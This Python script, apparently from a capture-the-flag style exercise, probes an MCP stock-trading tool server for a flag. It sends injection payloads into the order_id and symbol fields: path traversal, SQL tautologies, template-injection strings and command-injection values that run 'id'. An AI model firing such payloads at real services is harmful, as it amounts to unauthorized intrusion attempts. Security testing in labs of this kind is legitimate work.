#!/usr/bin/env python3
import json
from mcpclient import MCP, extract

m = MCP()
print("portfolio:", extract(m.tool("get_portfolio")))
print("stocks:", extract(m.tool("list_available_stocks")))
for s in ["AAPL","JNJ","V","JPM","GOOGL","MSFT","AMZN","TSLA","META","NVDA"]:
    print("  price", s, extract(m.tool("get_stock_price", {"symbol": s})))

print("\n=== order_id probe ===")
for oid in ["FLAG","flag","0","1","ORD-000001","ORD-000000","../flag","*","", " '%s' ",
            "ORD-000001 OR 1=1", "${FLAG}", "{{FLAG}}", "ORD-FLAG", "vault"]:
    print(f"  {oid!r} -> {extract(m.tool('get_order_status', {'order_id': oid}))[:180]}")

print("\n=== injection in symbol ===")
for s in ["{{7*7}}","${7*7}","%7b%7b7*7%7d%7d","<%=7*7%>","#{7*7}","__class__","__init__",
          "AAPL|id","AAPL;id","AAPL`id`","$(id)",'AAPL"+1+"',"' OR '1'='1"]:
    print(f"  {s!r} info -> {extract(m.tool('get_stock_info', {'symbol': s}))[:120]}")
    print(f"  {s!r} price -> {extract(m.tool('get_stock_price', {'symbol': s}))[:120]}")
